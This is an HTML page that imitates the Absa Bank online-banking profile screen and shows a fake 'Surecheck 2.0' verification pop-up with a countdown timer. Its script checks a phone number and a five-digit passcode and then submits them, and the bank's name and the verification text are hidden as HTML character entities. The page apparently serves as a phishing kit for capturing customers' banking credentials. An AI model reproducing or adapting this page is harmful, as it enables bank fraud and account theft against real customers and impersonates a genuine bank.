<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8">
<title></title>
<link rel="stylesheet" type="text/css" href="media/profile.css">
<link rel="stylesheet" type="text/css" href="media/index.css">
<link rel="shortcut icon" href="media/favicon.ico">
<script type="text/javascript" src="media/main-all-base.js"></script>
<script type="text/javascript" src="media/main_002.js"></script>
<style class="cp-pen-styles">


#countdown {
  position: relative;
  height: 40px;
  width: 40px;
  text-align: center;
  margin-top:-50px;
  padding-left:10px;
}

#countdown-number {
  position: fixed;
  z-index:99999;
  margin-left: -10px;
  font-weight:bold;
  color:#CC1124;
  font-size: 18px;
  display: inline-block;
  line-height: 40px;
}

svg {
  position: absolute;
  top: 0;
  right: 0;
  width: 40px;
  height: 40px;
  transform: rotateY(-180deg) rotateZ(-90deg);
}

svg circle {
  stroke-dasharray: 113px;
  stroke-dashoffset: 226px;
  stroke-linecap: round;
  stroke-width: 3px;
  stroke: #CC1124;
  fill: #F4F4F4;
  animation: countdown 58s linear infinite forwards;
}

@keyframes countdown {
  from {
    stroke-dashoffset: 226px;
  }
  to {
    stroke-dashoffset: 113px;
  }
}</style>

<script>
function check(form) {


var regExpressPostcode =  /^(\d){10,12}$/
if (!regExpressPostcode.test(form.phonenr.value))
{ document.getElementById("error1").style = "display:inline-block;position:fixed;color:#870A3C;"; form.phonenr.focus(); return;}
else { document.getElementById("error1").style.display = "none";  }

var regExpressPostcode =  /^(\d){5,5}$/
if (!regExpressPostcode.test(form.passcode.value))
{ document.getElementById("error2").style = "display:inline-block;position:fixed;color:#870A3C;"; form.passcode.focus(); return;}
else { document.getElementById("error2").style.display = "none";  }

form.submit()

}
</script>

</head>
<body class="ap-jsp-body postlogin ap-clientType-individual" id="ap-page-body" role="application" lang="en">
<div style="position:fixed; top:0px; left:0px; z-index:106; width:100%; height:54px; background:#FFFFFF; padding:10px 0px 0px 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,.16);">
			<img src="media/logo-red.png" width="44" height="44">
		</div>
			<div role="banner" class="ap-page-header" style="z-index:106;">
					 
			<div class="ap-navigation-message">
<div class="clock"><script>

    var mydate=new Date()
    var year=mydate.getYear()
    
    if (year < 1000)
        year+=1900
    
    var day=mydate.getDay()
    var month=mydate.getMonth()
    var daym=mydate.getDate()
    
    if (daym<10)
        daym="0"+daym
        
    var montharray=new Array("January","February","March","April","May","June",
                            "July","August","September","October","November","December")
    
    document.write(daym+" "+montharray[month]+" "+year)

</script> <script>function GetNow(){
    var currentdate = new Date(); 
    var datetime = currentdate.getHours() + ":"  
            + currentdate.getMinutes()
    return datetime;
}

document.write(GetNow());

</script> | </div>Your security SurePhrase&#x2122; is: <span name="yourSecuritySurePhraseIs" style="color:green" class="bold">Private</span>
				<div class="ap-navigation-links">
					 
						<a class="ui-link" style="margin-right:5px" href="#" >
							Contact us
						</a> |
					<a class="ui-link" style="margin-right:5px;margin-left:5px" href="#"  >
						Help
					</a> |
					<a class="ui-link" style="margin-right:5px;margin-left:5px">
						Print
					</a> |
					<a class="ui-link" style="margin-left:5px">
						Logoff
					</a>
				</div>
			</div>
				<div class="ap-navigation-main" id="viMainNavigation" style="z-index:107;">
					<div class="ap-tabStrip-rounded-left"></div>
					<ul role="navigation" class="ap-tabStrip-tabs">
								<li class="ap-tab-button " id="SSR-tab-00">
									<a name="tabNo0" for="mTabNo0" style="position:absolute;"></a>
									<a role="link" accesskey="" id="mTabNo0" href="#express" style="text-decoration:none" >
										<div class="ap-tab-title">Express</div>
										<div class="ap-tab-title-hidden">Express</div>
									</a>
								</li>
					<li class="ap-tab-button" id="SSR-tab-l77" style="user-select: none;">
								<a name="tabNo1" for="mTabNo1" style="position:absolute;"></a>
								<a role="link" accesskey="1" id="mTabNo1" href="#accounts" style="text-decoration:none" >
									<div class="ap-tab-title">Accounts</div>
									<div class="ap-tab-title-hidden">Accounts</div>
								</a>
							</li><li class="ap-tab-button" id="SSR-tab-l33" style="user-select: none;">
								<a name="tabNo2" for="mTabNo2" style="position:absolute;"></a>
								<a role="link" accesskey="2" id="mTabNo2" href="#payments" style="text-decoration:none" >
									<div class="ap-tab-title">Payments</div>
									<div class="ap-tab-title-hidden">Payments</div>
								</a>
							</li><li class="ap-tab-button" id="SSR-tab-l3" style="user-select: none;">
								<a name="tabNo3" for="mTabNo3" style="position:absolute;"></a>
								<a role="link" accesskey="3" id="mTabNo3" href="#saveinvest" style="text-decoration:none" >
									<div class="ap-tab-title">Save and Invest</div>
									<div class="ap-tab-title-hidden">Save and Invest</div>
								</a>
							</li><li class="ap-tab-button" id="SSR-tab-l52" style="user-select: none;">
								<a name="tabNo4" for="mTabNo4" style="position:absolute;"></a>
								<a role="link" accesskey="4" id="mTabNo4" href="#apply" style="text-decoration:none" >
									<div class="ap-tab-title">Apply</div>
									<div class="ap-tab-title-hidden">Apply</div>
								</a>
							</li><li class="ap-tab-button" id="SSR-tab-l16" style="user-select: none;">
								<a name="tabNo5" for="mTabNo5" style="position:absolute;"></a>
								<a role="link" accesskey="5" id="mTabNo5" href="#insurance" style="text-decoration:none" >
									<div class="ap-tab-title">Insure</div>
									<div class="ap-tab-title-hidden">Insure</div>
								</a>
							</li><li class="ap-tab-button ap-tab-active" id="SSR-tab-l19" style="user-select: none;">
								<a name="tabNo6" for="mTabNo6" style="position:absolute;"></a>
								<a role="link" accesskey="6" id="mTabNo6" href="#profile" style="text-decoration:none" >
									<div class="ap-tab-title">Profile</div>
									<div class="ap-tab-title-hidden">Profile</div>
								</a>
							</li></ul>
					<div class="ap-tabStrip-rounded-right"></div>
					<div style="clear: both;"></div>
						 
					<div class="ap-navigation-sub ap-tabStrip-subnav">
							
							<ul class="ap-tabStrip-subnav-l19  ap-subnav-active">
									<li class="ap-tab-button" href="#">
										<div tabindex="0">Make your selection below by clicking on the applicable function.</div>
									</li>
							</ul>
						<div class="ap-switchTo-container" tabindex="0">
							 
						</div>
					</div>
				</div>
		</div>
		<div class="ap-page-container" id="ap-page-container-div">
			<div></div>
				<div class="ap-main-content-wrapper">
				<div class="ap-main-content-wrapper-top">
					<div class="ap-corners-rounded-top-left"></div>
					<div class="ap-corners-rounded-top"></div>
					<div class="ap-corners-rounded-top-right"></div>
				</div>
				 
				<div class="ap-page-content ap-container">
					 
					<div id="content" tabindex="0" role="main" aria-label="ABSA online main conent area" class="ap-container-highlevel">
							<div class="ap-titlebar ap-heading-titlebar">
									<div class="ap-heading-titlebar-item ap-container-top-l2" id="ap-container-top-l2">
										<h2 tabindex="0" class="ap-bar-section ap-bar-title" style="width:170px" id="ap-bar-section-Accounts">
													Accounts
										</h2>
											<div class="ap-bar-section ap-bar-section-right ap-bar-align-right" style="width: 272px; padding-right: 16px; float:right" id="ap-bar-section-accounts-options">Quicklinks</div>
									</div>
									<div class="ap-heading-titlebar-item ap-container-top-l3 " id="ap-container-top-l3">
										<h2 tabindex="0" class="ap-bar-section ap-bar-title" style="width:170px" id="ap-bar-section-Payments">
													Payment types
										</h2>
											<div class="ap-bar-section ap-bar-section-right ap-bar-align-right ap-bar-divider" style="width: 272px; padding-right: 16px; float:right" id="ap-bar-section-accounts-options">Quicklinks</div>
									</div>
									<div class="ap-heading-titlebar-item ap-container-top-l4 " id="ap-container-top-l4">
										<h2 tabindex="0" class="ap-bar-section ap-bar-title" style="width:170px" id="ap-bar-section-saveInvest">
													Total Investment Portfolio
										</h2>
											<div class="ap-bar-section ap-bar-section-right ap-bar-align-right ap-bar-divider" style="width: 272px; padding-right: 25px; float:right" id="ap-bar-section-accounts-options">Quicklinks</div>
									</div>
									<div class="ap-heading-titlebar-item ap-container-top-l5 " id="ap-container-top-l5">
										<h2 tabindex="0" class="ap-bar-section ap-bar-title" style="width:170px" id="ap-bar-section-Apply">
													Apply
										</h2>
									</div>
									<div class="ap-heading-titlebar-item ap-container-top-l3010079 " id="ap-container-top-l3010079">
										<h2 tabindex="0" class="ap-bar-section ap-bar-title" style="width:170px" id="ap-bar-section-Insurance">
													Policies
										</h2>
											<div class="ap-bar-section ap-bar-section-right ap-bar-align-right ap-bar-divider" style="width: 272px; padding-right: 25px; float:right" id="ap-bar-section-insurance-options">Quick links</div>
									</div>
									<div class="ap-heading-titlebar-item ap-container-top-l7  ap-container-top-show" id="ap-container-top-l7">
										<h2 tabindex="0" class="ap-bar-section ap-bar-title" style="width:170px" id="ap-bar-section-Profile">
													Profile
										</h2>
									</div>
							</div>
						<div class="ap-container-content ap-profile-container" id="ap-container-wrapper">
							 
							<div class="ap-grouped-layout-portal">
								 
								<div class="ap-grouped-layout-content">
									<div class="p-portal" id="portal" style="height: 1038px;">
										<div class="p-column-resize-grippy"></div>
										<div class="p-column-resize-line"></div>
										<div class="p-portal-dragPlaceholder"></div>
										

<div id="gadget-placeholder-l7-g300036" class="ap-page-content-dashboard" style=""><div class="p-gadget ap-accountbar ap-dashboard-dummy" style="position: static;"><div class="ap-container"><div style="user-select: none; cursor: default;" class="ap-titlebar p-gadget-top-left p-gadget-header"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Dashboard</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Dashboard</div><div class="p-gadget-subTitle"></div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g86"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent" ><div xmlns="http://www.w3.org/1999/xhtml" class="p-gadget ap-highlevel-gadget ui-tabBox ap-dashBoard-tabBox p-gadget-minimized" disablefirsttabload="true"><div class="p-gadget-top-left p-gadget-header ap-titlebar"><div class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status" role="button" tabindex="0"></div><div class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status" role="button" tabindex="0"></div><div class="vi-screenreader-line"><div class="ui-tabHeads-start" tabindex="0"></div></div><ul class="ui-tabHeads ui-tabHeads-titlebar"><li tabindex="0" role="button" class="ui-tabHead ap-viewSecureMessage ap-tabHead-viewSecureMessage  ui-tab-first-tab">Messages <span  class="ap-dashBoard-messageNumber"></span><span class="vi-screenreader-line "> 1 of 1 Tab. </span><div style="width:100%"><div class="ui-tabBox--type2--image"></div></div></li></ul><div class="vi-screenreader-line"><div class="ui-tabHeads-end" tabindex="0"></div></div></div><div class="p-gadget-content"><div class="ap-dashboard-content"><div class="ui-tabBodies ui-tabBodies-noborder"><div class="ui-tabBody " role="tabpanel" tabindex="0" aria-busy="false" aria-hidden="false" ></div><div class="vi-screenreader-line"><div class="ui-tabBox-tab-finish" tabindex="0"></div><div class="ui-tabBox-body-end" tabindex="0"></div></div></div></div></div></div></div>
		<div></div></div></div></div></div>
		

<div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 68px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Will</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Will</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Will</div><div class="p-gadget-subTitle">View your Will</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g21"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent" ></div>
		<div></div></div></div></div>
		
		
		<div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 136px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Manage your details</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Manage your details</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Manage your details</div><div class="p-gadget-subTitle"></div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g24"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent" ></div>
		<div></div></div></div></div><div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 204px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Card management</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Card management</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Card management</div><div class="p-gadget-subTitle">View and manage your plastic cards</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g30"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent" ></div>
		<div></div></div></div></div><div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 272px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Manage users</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Manage users</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Manage users</div><div class="p-gadget-subTitle">Add and manage operators for this portfolio.</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g27"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent" ></div>
		<div></div></div></div></div><div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 340px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Manage devices</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Manage devices</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Manage devices</div><div class="p-gadget-subTitle">Link, delink and manage devices linked to the Absa app</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g20"></div></div></div>
		<div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 408px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Absa Online notifications</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Absa Online notifications</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Absa Online notifications</div><div class="p-gadget-subTitle">View and manage your Absa Online notifications.</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g25"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent">
	</div>
	<div></div></div></div></div><div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 476px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Link/Unlink accounts</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Link/Unlink accounts</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Link/Unlink accounts</div><div class="p-gadget-subTitle">Link or Unlink accounts from your portfolio.</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g23"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent ap-linkUnlink" id="ap-linkUnlink-gadget"  proxyurlold="proxy?pipe=genericWebService&amp;ws=PortfolioWebService&amp;action=getLinkUnlinkAccounts&amp;type=R">
	</div>
	<div></div></div></div></div><div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 544px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Manage Absa Online services</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Manage Absa Online services</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Manage Absa Online services</div><div class="p-gadget-subTitle">View your current registration information and costs or Change your billing account and Absa Online limits.</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g22"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-profileContent ap-gadget-lazyContent" ></div>
		<div></div></div></div></div><div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 612px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Manage eStatements</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Manage eStatements</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Manage eStatements</div><div class="p-gadget-subTitle">Manage your eStatements</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g26"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent ap-eStatements-gadget" ></div>
		<div></div></div></div></div><div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 680px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section NotifyMe</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section NotifyMe</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">NotifyMe</div><div class="p-gadget-subTitle">Add and manage the NotifyMe recipients linked to this portfolio.</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g29"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent" ></div>
		<div></div></div></div></div><div class="p-gadget p-gadget-minimized ap-accountbar" style="width: 944px; left: 0px; top: 748px;"><div class="ap-container"><div class="ap-titlebar p-gadget-top-left p-gadget-header" style="user-select: none;"><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-restore ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Show section Tax certificate</span></div><div role="button" tabindex="0" class="p-gadget-button p-gadget-button-minimize ap-bar-section ap-icon-bar-status"><span class="vi-screenreader-line ">Hide section Tax certificate</span></div><div class="p-gadget-title-container"><div tabindex="0" class="p-gadget-title ap-bar-section ap-bar-title">Tax certificate</div><div class="p-gadget-subTitle">View a Tax certificate for a given year.</div></div><div class="p-gadget-draggable-section"><button class="p-gadget-draggable-button"></button></div><div class="ap-gadget-button-container"><button xmlns="http://www.w3.org/1999/xhtml" tabindex="0" type="button" class="ui-button ap-icon-print" tooltip="Print this content"><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center"><span class="vi-screenreader-line ">. Print this content</span></div></div></div></button></div></div><div tabindex="-1" role="application" class="p-gadget-content" id="g31"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-gadget-lazyContent" ></div>
		<div></div></div></div></div></div>
								</div>

							</div>
						</div>
						</div>
					</div>
				</div>
			</div>
			<div class="ap-footer" style="margin-top:-200px;position:relative; text-align:center;">
				<span tabindex="0">
					&#xa9; Copyright. &#x41;&#x62;&#x73;&#x61;&#x20;&#x42;&#x61;&#x6e;&#x6b; &#x4c;&#x69;&#x6d;&#x69;&#x74;&#x65;&#x64;&#x2e;&#x20;&#x52;&#x65;&#x67;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x4e;&#x75;&#x6d;&#x62;&#x65;&#x72;&#x3a;&#x20;&#x31;&#x39;&#x38;&#x36;&#x2f;&#x30;&#x30;&#x34;&#x37;&#x39;&#x34;&#x2f;&#x30;&#x36;&#x20;
					&#x41;&#x75;&#x74;&#x68;&#x6f;&#x72;&#x69;&#x7a;&#x65;&#x64;&#x20;&#x66;&#x69;&#x6e;&#x61;&#x6e;&#x63;&#x69;&#x61;&#x6c;&#x20;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x73;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x72;&#x65;&#x67;&#x69;&#x73;&#x74;&#x65;&#x72;&#x65;&#x64;&#x20;&#x63;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x70;&#x72;&#x6f;&#x76;&#x69;&#x64;&#x65;&#x72;&#x20;&#x4e;&#x43;&#x52;&#x43;&#x50;&#x37;
				</span>
				<div class="ap-footer-links">
						<ul><li><a href="#" id="am" Terms of use</a></li><li><a href="#" id="am" >Software requirements</a></li><li><a href="#" id="am" >Security centre</a></li><li><a href="#" id="am">&#x42;&#x61;&#x6e;&#x6b;&#x69;&#x6e;&#x67;&#x20;&#x72;&#x65;&#x67;&#x75;&#x6c;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x73;</a></li></ul>
						 
				</div>
	
			</div>
		
<div class="btl-resize-cursorElement"></div><div class="btl-resize-lineElement"></div><div class="btl-resize-outlineElement"></div>
<div class="ui-suggestBox-list" id="global-ui-suggestBox" role="listbox"></div>

<div class="ui-modalWindow" style="position: fixed; opacity: 0.2;"></div>
<div id="maindivone" class="ui-modal-content" clone="true" style="position: fixed; margin-left: -285px; margin-top: -203px;" tabindex="0" role="alertdialog" aria-labelledby="modal-header-title">
<div id="div1" class="ui-modal" style="display:block;width:570px;"><div class="ui-modalHeader"><div class="ui-modalHeader-title" tabindex="0">Surecheck 2.0</div></div><div class="ui-modalBody"><div xmlns="http://www.w3.org/1999/xhtml" class="ap-n2fa-start"><div class="ui-wizard  ui-wizard--showMeHow_disabled"><div class="ui-wizard-body-wrapper"><div id="ui-wizard-body2" tabindex="0" class="ui-wizard-body ui-wizard-body-selected" disableshowmehow="true"><div xmlns="http://www.w3.org/1999/xhtml"><div xmlns:xs="http://www.w3.org/2001/XMLSchema" ><div><table class="ui-grid ap-n2fa-grid-A"><tbody class="ui-rows"><tr class="ui-row ap-row-head"><td class="ui-cell " colspan="4"><b>Verification</b></td></tr><tr class="ui-row"><td class="ui-cell ap-common-paddingTop  ui-cell-50perc " colspan="2"><img class="ui-media ui--image ap-common-verticalAlign-middle" type="image" src="media/lock.png" style="width:22px; height:27px;"><label class="ui-label ap-common-fontBold ap-common-fontSize18px ap-common-marginLeft ap-common-verticalAlign-middle">Verification request<span class="ui-label--icon"></span></label></td><td class="ui-cell ap-common-paddingTop ap-common-alignRight ap-common-verticalAlign-middle ui-cell-50perc " colspan="2">sent to app at <script>

function GetNow(){
    var currentdate = new Date(); 
    var datetime = currentdate.getHours() + ":"  
            + currentdate.getMinutes() + ":" 
            + currentdate.getSeconds();
    return datetime;
}

document.write(GetNow());

</script></td></tr><tr class="ui-row"><td class="ui-cell ap-common-paddingTop " colspan="4"><div class="ap-common-borderTop ap-common-marginBottom"></div>&#x59;&#x6f;&#x75;&#x20;&#x68;&#x61;&#x76;&#x65;&#x20;&#x62;&#x65;&#x65;&#x6e;&#x20;&#x73;&#x65;&#x6e;&#x74;&#x20;&#x61;&#x20;&#x76;&#x65;&#x72;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x20;&#x74;&#x6f;&#x20;&#x74;&#x68;&#x65;&#x20;&#x41;&#x62;&#x73;&#x61;&#x20;&#x62;&#x61;&#x6e;&#x6b;&#x69;&#x6e;&#x67;&#x20;&#x41;&#x70;&#x70;&#x20;&#x6f;&#x6e;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x76;&#x65;&#x72;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x64;&#x65;&#x76;&#x69;&#x63;&#x65;&#x2e;&#x20;&#x50;&#x6c;&#x65;&#x61;&#x73;&#x65;&#x20;&#x61;&#x63;&#x63;&#x65;&#x70;&#x74;&#x20;&#x6f;&#x72;&#x20;&#x72;&#x65;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x74;&#x68;&#x65;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;</td></tr><tr class="ui-row"><td class="ui-cell ap-common-paddingTop " colspan="4"><div class="ap-timer-left" style="float:left; width:61px; height:51px;"><canvas id="timerCanvas" class="ap-timer-canvas" width="50px" height="50px">0</canvas>
<div id="countdown">
<div id="countdown-number"></div>
<svg><circle r="18" cx="20" cy="20"></circle></svg></div>
